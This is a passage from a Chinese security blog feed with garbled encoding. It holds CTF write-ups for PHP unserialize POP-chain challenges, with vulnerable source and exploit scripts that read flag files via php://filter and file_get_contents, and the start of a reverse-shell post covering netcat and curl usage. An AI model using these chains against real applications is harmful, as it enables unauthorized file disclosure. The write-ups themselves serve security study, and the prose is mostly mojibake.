class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div><p>å…ˆæ‰¾å‡ºå¯ä»¥ getflag çš„ç‚¹ï¼Œåœ¨ <code>Modifier</code>  ç±»ä¸­ <code>append</code>  å‡½æ•°æœ‰ <code>include</code>  å‡½æ•°å¯ä»¥æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥åˆ©ç”¨ï¼Œ <code>__invoke</code>  å‡½æ•°ç›´æ¥è°ƒç”¨äº† <code>append</code> ï¼Œåœ¨ Testlei ä¸­ <code>__get</code>  å°† p ä½œä¸ºå‡½æ•°è°ƒç”¨ï¼Œä¼šè§¦å‘ <code>__invoke</code> , åœ¨ <code>__totring</code>  æ–¹æ³•ä¸­ <code>$this-&gt;str</code>  èµ‹äºˆ <code>test</code>  ç±»ï¼Œåœ¨ <code>test</code>  ç±»è¯»å– <code>source</code>  å˜é‡ï¼Œï¼ˆå› ä¸º <code>test</code>  ç±»ä¸­æ²¡æœ‰ <code>source</code>  å±æ€§ï¼Œåˆ™æ˜¯è®¿é—®äº†ä¸å¯è®¿é—®çš„å±æ€§ï¼‰åˆ™ä¼šè‡ªåŠ¨è°ƒç”¨ <code>__get</code>  é­”æœ¯æ–¹æ³•ï¼Œ <code>__wakeup</code>  å‡½æ•°å°†å¯¹è±¡è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œä¼šè§¦å‘ <code>__toString</code> ï¼Œè€Œ <code>__wakeup</code>  åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ï¼Œå¯ä»¥å½“ä½œ pop é“¾å¤´ï¼Œè€Œå°¾æ—¶ <code>include</code>  å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨ <code>var</code>  æ„é€  php ä¸ºåè®®è·å– flag</p><p>pop é“¾ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show:__wakeup -&gt; Show:__toString -&gt; Test:__get -&gt; Modifier:__invoke -&gt;Modifier: append</span><br></pre></td></tr></table></figure></div><p>exp:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>; <span class="comment">//æ„é€ phpä¸ºåè®®è·å–flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;source=<span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125; <span class="comment">//1.å°†ç”¨åˆ°çš„ç±»å†™å‡ºå½¢æˆæ¡†æ¶å¹¶è¡¨æ˜ç±»çš„å±æ€§ï¼ˆå˜é‡ï¼‰</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>(); <span class="comment">//å°†ç”¨åˆ°çš„ç±»å®ä¾‹åŒ–ï¼Œç”¨åˆ°å‡ æ¬¡å®ä¾‹åŒ–å‡ æ¬¡</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p= <span class="variable">$d</span>;    <span class="comment">//æ ¹æ®popé“¾å°†å¯¹è±¡ä¸²è”èµ·æ¥</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));  <span class="comment">//åºåˆ—åŒ–å¤´å¹¶urlç¼–ç ï¼ˆåœ¨è¿™ä¸ªé¢˜ä¸­æœ‰protectedä¿®é¥°çš„å±æ€§ï¼Œä¼šæœ‰ä¸å¯è§å­—ç¬¦ï¼‰</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="2021-å¼ºç½‘æ¯-èµŒå¾’"><a class="markdownIt-Anchor" href="#2021-å¼ºç½‘æ¯-èµŒå¾’">#</a> 2021 å¼ºç½‘æ¯ èµŒå¾’</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_hint</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  <span class="title class_">Start</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>å°¾éƒ¨å¯ä»¥çœ‹åˆ° <code>Room</code>  ç±»ä¸­æœ‰ä¸ª <code>Get_hint()</code>  æ–¹æ³•ï¼Œé‡Œé¢æœ‰ä¸€ä¸ª <code>file_get_contents</code> ï¼Œå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªè¯»å– flag æ–‡ä»¶äº†ï¼Œç„¶åå°±æ˜¯å¾€å‰å€’æ¨ï¼Œ <code>Room</code>  ç±»ä¸­ <code>__invoke()</code>  æ–¹æ³•è°ƒç”¨äº† <code>Get_hint()</code> ï¼Œç„¶å <code>Room</code>  ç±»çš„ <code>__get()</code>  é‡Œé¢æœ‰ä¸ª <code>return $function()</code>  å¯ä»¥è°ƒç”¨ <code>__invoke()</code> ï¼Œå†å¾€å‰çœ‹ï¼Œ <code>Info</code>  ç±»ä¸­çš„ <code>__toString()</code>  ä¸­æœ‰ <code>Room</code>  ç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§ï¼Œæ‰€ä»¥å¯ä»¥è°ƒç”¨ <code>__get()</code> ï¼Œç„¶å <code>Start</code>  ç±»ä¸­æœ‰ä¸ª <code>_sayhello()</code>  å¯ä»¥è°ƒç”¨ <code>__toString()</code> ï¼Œç„¶ååœ¨ <code>Start</code>  ç±»ä¸­ <code>__wakeup()</code>  æ–¹æ³•ä¸­ç›´æ¥è°ƒç”¨äº† <code>_sayhello()</code> ï¼Œè€Œæˆ‘ä»¬çŸ¥é“çš„æ˜¯ï¼Œè¾“å…¥å­—ç¬¦ä¸²ä¹‹åå°±ä¼šå…ˆè¿›å…¥ <code>__wakeup()</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¤´ -&gt; Start::__wakeup() -&gt; Start::_sayhello() -&gt; Info::__toString() -&gt; Room::__get() -&gt; Room::invoke() -&gt; Room::Get_hint() </span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; file[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; a = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>åœ¨æ„å»º pop é“¾æ—¶ï¼Œé™¤ <code>__construct</code>  å‡½æ•°ä¸€èˆ¬ä¸éœ€è¦å†™å‡ºï¼Œ   å˜é‡çš„æƒé™ä¸æºç ä¿æŒä¸€è‡´ï¼Œåœ¨ä¸²è”å¯¹è±¡æ—¶ï¼Œéœ€è¦ä¸æºç çš„å¯¹åº”å…³ç³»ä¿æŒä¸€è‡´ï¼Œæ¯”å¦‚ï¼š <code>$b -&gt; file['filename'] = $c;</code></p><p>â€”â€”â€”â€”ENDâ€”â€”â€”â€”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php-unserialize&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#php-unserialize&quot;&gt;#&lt;/a&gt; PHP Unserialize&lt;/h1&gt;
&lt;h2 id=&quot;ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–&quot;&gt;&lt;a class=&quot;mark</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Reverse shell</title>
    <link href="http://example.com/2024/04/09/Reverse-shell/"/>
    <id>http://example.com/2024/04/09/Reverse-shell/</id>
    <published>2024-04-09T04:29:05.000Z</published>
    <updated>2024-04-11T03:47:13.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åå¼¹shell"><a class="markdownIt-Anchor" href="#åå¼¹shell">#</a> åå¼¹ shell</h1><h2 id="åå¼¹shell-2"><a class="markdownIt-Anchor" href="#åå¼¹shell-2">#</a> åå¼¹ shell</h2><h3 id="linuxç¯å¢ƒä¸‹å¸¸ç”¨ç½‘ç»œå·¥å…·"><a class="markdownIt-Anchor" href="#linuxç¯å¢ƒä¸‹å¸¸ç”¨ç½‘ç»œå·¥å…·">#</a> linux ç¯å¢ƒä¸‹å¸¸ç”¨ç½‘ç»œå·¥å…·</h3><h4 id="ncnetcat"><a class="markdownIt-Anchor" href="#ncnetcat">#</a> nc(netcat)</h4><p>å‚æ•°è¯´æ˜</p><pre><code>nc.exe -h å³å¯çœ‹åˆ°å„å‚æ•°çš„ä½¿ç”¨æ–¹æ³•ã€‚åŸºæœ¬æ ¼å¼ï¼šnc [-options] hostname port[s] [ports] ...nc -l -p port [options] [hostname] [port]-d          åå°æ¨¡å¼-e          ç¨‹åºé‡å®šå‘ï¼Œä¸€æ—¦è¿æ¥ï¼Œå°±æ‰§è¡Œ [å±é™©!!]-g gateway  source-routing hop point[s], up to 8    è®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šå¯è®¾ç½®8ä¸ªã€‚-G num      source-routing pointer: 4, 8, 12, ...   è®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°ã€‚-h          å¸®åŠ©ä¿¡æ¯-i secs     å»¶æ—¶çš„é—´éš”-l          ç›‘å¬æ¨¡å¼ï¼Œç”¨äºå…¥ç«™è¿æ¥ (ç›‘å¬æœ¬åœ°ç«¯å£)-L          è¿æ¥å…³é—­å,ä»ç„¶ç»§ç»­ç›‘å¬-n          æŒ‡å®šæ•°å­—çš„IPåœ°å€ï¼Œä¸èƒ½ç”¨hostnameã€‚å³ç›´æ¥ä½¿ç”¨IPåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ã€‚-o file     æŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜ã€‚-p port     æœ¬åœ°ç«¯å£å· (æŒ‡å®šæœ¬åœ°ç«¯å£ )-r          éšæœºæœ¬åœ°åŠè¿œç¨‹ç«¯å£-s addr     æœ¬åœ°æºåœ°å€-t          ä½¿ç”¨TELNETäº¤äº’æ–¹å¼(ç”¨telnetæ¥å›åº” )-u          UDPæ¨¡å¼-v          è¯¦ç»†è¾“å‡º--ç”¨ä¸¤ä¸ª-v( -vv)å¯å¾—åˆ°æ›´è¯¦ç»†çš„å†…å®¹. è·å¾—ç«¯å£ä¿¡æ¯-w secs     timeoutçš„æ—¶é—´-z          å°†è¾“å…¥è¾“å‡ºå…³æ‰--åªç”¨äºæ‰«æ. ç«¯å£çš„è¡¨ç¤ºæ–¹æ³•å¯å†™ä¸ºM-Nçš„èŒƒå›´æ ¼å¼ã€‚</code></pre><p>è¿æ¥è¿œç¨‹ä¸»æœº</p><p>â€‹ <code>nc -nvv Target_ip Target_port</code></p><p>ç›‘å¬æœ¬åœ°ä¸»æœº</p><p>â€‹ <code>nc -l -p Local_port</code></p><p>ç«¯å£æ‰«æ</p><p>â€‹ <code>nc -v Target_ip Target_port #å¯æŒ‡å®šèŒƒå›´</code></p><p>ç«¯å£ç›‘å¬</p><p>â€‹ <code>nc -l -p Local_port</code></p><p>è¿œç¨‹æ–‡ä»¶ä¼ è¾“</p><p>â€‹ <code>nc Target_ip Target_port &lt; Target_File</code></p><p>æ¨¡æ‹Ÿ HTTP headers</p><pre><code>[root@hatest1 ~]# nc www.linuxfly.org 80 GET / HTTP/1.1 Host: ispconfig.org Referrer: mypage.com User-Agent: my-browserHTTP/1.1 200 OK Date: Tue, 16 Dec 2008 07:23:24 GMT Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8 Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/ Expires: 0 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Cache-Control: private, post-check=0, pre-check=0, max-age=0 Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/ Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html [......]echo -n &quot;GET / HTTP/1.0&quot;r&quot;n&quot;r&quot;n&quot; | nc host.example.com 80è¿æ¥åˆ°ä¸»æœºå¹¶æ‰§è¡Œ</code></pre><p>æ­£å‘ shellï¼Œåå‘ shell</p><h4 id="curl"><a class="markdownIt-Anchor" href="#curl">#</a> curl</h4><p>HTTP å‘½ä»¤è¡Œå·¥å…·ï¼Œæ”¯æŒæ–‡ä»¶çš„ä¸Šä¼ å’Œä¸‹è½½ï¼Œæ˜¯ç»¼åˆä¼ è¾“å·¥å…·</p><p>å‘é€ GET è¯·æ±‚</p><p>â€‹ <code>curl URL?a=1&amp;b=nihao</code></p><p>å‘é€ POST è¯·æ±‚</p><p>â€‹ <code>curl -X POST -d 'a=1&amp;b=nihao' URL</code></p><p>å‘é€ json æ ¼å¼è¯·æ±‚</p><p>â€‹ <code>curl -H &quot;Content-type: application?json&quot; -X POST -d '&#123;&quot;abc&quot;:123.&quot;bcd&quot;:&quot;nihao&quot;&#125;' URL</code></p><p>â€‹ <code>curl -H &quot;Content-Type: application/json&quot; -X POST -d @test.json URL</code></p><h5 id="1-ä¸‹è½½option-oæˆ–è€…option-o"><a class="markdownIt-Anchor" href="#1-ä¸‹è½½option-oæˆ–è€…option-o">#</a> 1ã€ä¸‹è½½ (option:-o æˆ–è€… option:-O)</h5><p>1.1ã€ä¸‹è½½é¡µé¢ï¼š</p><p><code>curl -o dodo1.jpg http:www.linux.com/dodo1.JPG</code> <br># è¦æ³¨æ„ - O è¿™é‡Œåé¢çš„ url è¦å…·ä½“åˆ°æŸä¸ªæ–‡ä»¶ï¼Œä¸ç„¶æŠ“ä¸ä¸‹æ¥<br> <code>curl -O http://www.linux.com/dodo1.JPG</code></p><p>1.2ï¼šå¾ªç¯ä¸‹è½½<br>æœ‰æ—¶å€™ä¸‹è½½å›¾ç‰‡å¯ä»¥èƒ½æ˜¯å‰é¢çš„éƒ¨åˆ†åç§°æ˜¯ä¸€æ ·çš„ï¼Œå°±æœ€åçš„å°¾æ¤åä¸ä¸€æ ·ã€‚è¿™æ ·å°±ä¼šæŠŠ dodo1ï¼Œdodo2ï¼Œdodo3ï¼Œdodo4ï¼Œdodo5 å…¨éƒ¨ä¿å­˜ä¸‹æ¥<br> <code>curl -O http://www.linux.com/dodo[1-5].JPG</code></p><p>1.3ï¼šä¸‹è½½é‡å‘½å<br>åœ¨ hello/dodo1.JPG çš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥å°±ä¼šå˜æˆ hello_dodo1.JPG, å…¶ä»–æ–‡ä»¶ä¾æ­¤ç±»æ¨ï¼Œä»è€Œæœ‰æ•ˆçš„é¿å…äº†æ–‡ä»¶è¢«è¦†ç›–<br> <code>curl -o #1_#2.JPG http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</code></p><p>ç”±äºä¸‹è½½çš„ hello ä¸ bb ä¸­çš„æ–‡ä»¶åéƒ½æ˜¯ dodo1ï¼Œdodo2ï¼Œdodo3ï¼Œdodo4ï¼Œdodo5ã€‚å› æ­¤ç¬¬äºŒæ¬¡ä¸‹è½½çš„ä¼šæŠŠç¬¬ä¸€æ¬¡ä¸‹è½½çš„è¦†ç›–ï¼Œè¿™æ ·å°±éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚<br> <code>curl -O 